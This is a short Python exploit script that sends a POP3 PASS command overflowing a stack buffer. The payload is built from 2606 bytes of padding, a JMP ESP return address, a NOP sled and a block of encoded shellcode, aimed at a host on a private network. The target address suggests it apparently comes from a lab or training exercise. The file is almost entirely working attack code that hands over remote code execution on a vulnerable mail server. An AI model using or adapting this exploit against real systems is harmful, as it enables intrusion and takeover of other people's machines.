#!/usr/bin/python3
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode =  b""
shellcode += b"\xb8\x8a\xf5\x92\xe6\xdb\xd6\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc"
shellcode += b"\x03\xc9\xfb\x70\x13\x31\xeb\xf7\xdc\xc9\xec"
shellcode += b"\x97\x55\x2c\xdd\x97\x02\x25\x4e\x28\x40\x6b"
shellcode += b"\x63\xc3\x04\x9f\xf0\xa1\x80\x90\xb1\x0c\xf7"
shellcode += b"\x9f\x42\x3c\xcb\xbe\xc0\x3f\x18\x60\xf8\x8f"
shellcode += b"\x6d\x61\x3d\xed\x9c\x33\x96\x79\x32\xa3\x93"
shellcode += b"\x34\x8f\x48\xef\xd9\x97\xad\xb8\xd8\xb6\x60"
shellcode += b"\xb2\x82\x18\x83\x17\xbf\x10\x9b\x74\xfa\xeb"
shellcode += b"\x10\x4e\x70\xea\xf0\x9e\x79\x41\x3d\x2f\x88"
shellcode += b"\x9b\x7a\x88\x73\xee\x72\xea\x0e\xe9\x41\x90"
shellcode += b"\xd4\x7c\x51\x32\x9e\x27\xbd\xc2\x73\xb1\x36"
shellcode += b"\xc8\x38\xb5\x10\xcd\xbf\x1a\x2b\xe9\x34\x9d"
shellcode += b"\xfb\x7b\x0e\xba\xdf\x20\xd4\xa3\x46\x8d\xbb"
shellcode += b"\xdc\x98\x6e\x63\x79\xd3\x83\x70\xf0\xbe\xcb"
shellcode += b"\xb5\x39\x40\x0c\xd2\x4a\x33\x3e\x7d\xe1\xdb"
shellcode += b"\x72\xf6\x2f\x1c\x74\x2d\x97\xb2\x8b\xce\xe8"
shellcode += b"\x9b\x4f\x9a\xb8\xb3\x66\xa3\x52\x43\x86\x76"
shellcode += b"\xf4\x13\x28\x29\xb5\xc3\x88\x99\x5d\x09\x07"
shellcode += b"\xc5\x7e\x32\xcd\x6e\x14\xc9\x86\x50\x41\xe6"
shellcode += b"\xd4\x39\x90\x08\xc3\xb3\x1d\xee\x99\xd3\x4b"
shellcode += b"\xb9\x35\x4d\xd6\x31\xa7\x92\xcc\x3c\xe7\x19"
shellcode += b"\xe3\xc1\xa6\xe9\x8e\xd1\x5f\x1a\xc5\x8b\xf6"
shellcode += b"\x25\xf3\xa3\x95\xb4\x98\x33\xd3\xa4\x36\x64"
shellcode += b"\xb4\x1b\x4f\xe0\x28\x05\xf9\x16\xb1\xd3\xc2"
shellcode += b"\x92\x6e\x20\xcc\x1b\xe2\x1c\xea\x0b\x3a\x9c"
shellcode += b"\xb6\x7f\x92\xcb\x60\x29\x54\xa2\xc2\x83\x0e"
shellcode += b"\x19\x8d\x43\xd6\x51\x0e\x15\xd7\xbf\xf8\xf9"
shellcode += b"\x66\x16\xbd\x06\x46\xfe\x49\x7f\xba\x9e\xb6"
shellcode += b"\xaa\x7e\xae\xfc\xf6\xd7\x27\x59\x63\x6a\x2a"
shellcode += b"\x5a\x5e\xa9\x53\xd9\x6a\x52\xa0\xc1\x1f\x57"
shellcode += b"\xec\x45\xcc\x25\x7d\x20\xf2\x9a\x7e\x61"


# 5F4A358F FFE4      JMP ESP
# 5f4a358f

jmpespaddr = b'\x8f\x35\x4a\x5f'
prepad = bytes(("A" * 2606).encode())
nopsled = b'\x90' * 16 #accidentally sent \x60, because typo, and it still worked, weirdly enough.
padding = bytes(("C" * (3500 - 2606 - 4 - 16 - 351)).encode())
buffer = prepad + jmpespaddr + nopsled + shellcode + padding

try:
    print("\nSending bufferoverflow fileless attack")
    connect=s.connect(('192.168.55.134',110)) 
    s.recv(1024)
    s.send(b'USER operator\r\n')
    s.recv(1024)
    s.send(b'PASS ' + buffer + b'\r\n')
    print("\nDone!")
    s.close()
except Exception as e:
    print("Could not connect to POP3")
    print(e)
